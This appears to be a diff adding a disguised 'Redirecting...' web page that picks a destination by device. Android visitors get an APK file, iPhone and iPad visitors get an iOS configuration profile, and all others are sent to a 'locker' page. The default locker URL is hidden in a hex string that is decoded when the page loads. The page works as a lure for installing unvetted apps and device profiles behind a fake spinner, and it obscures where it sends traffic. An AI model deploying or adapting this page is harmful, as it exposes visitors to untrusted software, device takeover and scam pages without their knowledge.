@@ -1,0 +1,65 @@
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+<title>Redirecting...</title>
+<style>body{background:#000}.loading{position:absolute;top:50%;left:50%;width:30px;height:30px;margin:-20px 0 0 -20px;border-width:5px;border-style:solid;border-color:#fff #fff rgba(255,255,255,.5) rgba(255,255,255,.5);opacity:.9;border-radius:20px;-webkit-animation:rotate 1s linear infinite;-ms-animation:rotate 1s linear infinite}@-webkit-keyframes rotate{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(360deg)}}@-ms-keyframes rotate{0%{-ms-transform:rotate(0)}100%{-ms-transform:rotate(360deg)}}</style>
+</head>
+<body>
+<div class="loading"></div>
+<script>
+        /* 
+           --------------
+           |   CONFIG   | 
+           --------------
+
+            ► Edit the variables below the change the redirect URLs.
+            ► By default, these will go to the following values:
+                Android  → App.apk
+                iOS      → iOS.mobileconfig
+                PC/Other → <Your Locker Link>
+            ► If you want to change the filename for iOS or Android,
+              edit the filenames below so that the redirect is done
+              properly. It is recommended not to change the locker
+              link as it won't update in the actual APK.
+        */
+
+        // # START CONFIG #
+        
+        // Android
+        var AndroidRedirectLink = "Android_Redirect_Link"
+        
+        // iOS
+        var iOSRedirectLink = "iOS_Redirect_Link";
+        
+        // Locker Link
+        var LockerLink = "Locker_Link";
+        
+        // # END CONFIG #
+
+        // Check if default values are used and replace
+        AndroidRedirectLink = (AndroidRedirectLink == "Android_Redirect_Link" ? "App.apk" : AndroidRedirectLink);
+        iOSRedirectLink = (iOSRedirectLink == "iOS_Redirect_Link" ? "iOS.mobileconfig" : iOSRedirectLink);
+        LockerLink = (LockerLink == "Locker_Link" ? hexToAscii("68747470733A2F2F6F6768656C7065722E6E65742F6170702F696E6465782D70726F6F662E68746D6C") : LockerLink);
+
+        // Perform redirect
+        setTimeout(function() {
+            if (/(android)/i.test(navigator.userAgent)) {
+                document.location=AndroidRedirectLink;
+            } else if (/ipad|iphone|ipod/i.test(navigator.userAgent)) {
+                document.location=iOSRedirectLink;
+            } else {
+                document.location=LockerLink;
+            }
+        }, 1337);
+
+        function hexToAscii(hexString)
+        {
+            var hex  = hexString.toString();
+            var str = '';
+            for (var n = 0; n < hex.length; n += 2) {
+                str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
+            }
+            return str;
+        }
+    </script>
+</body></html>
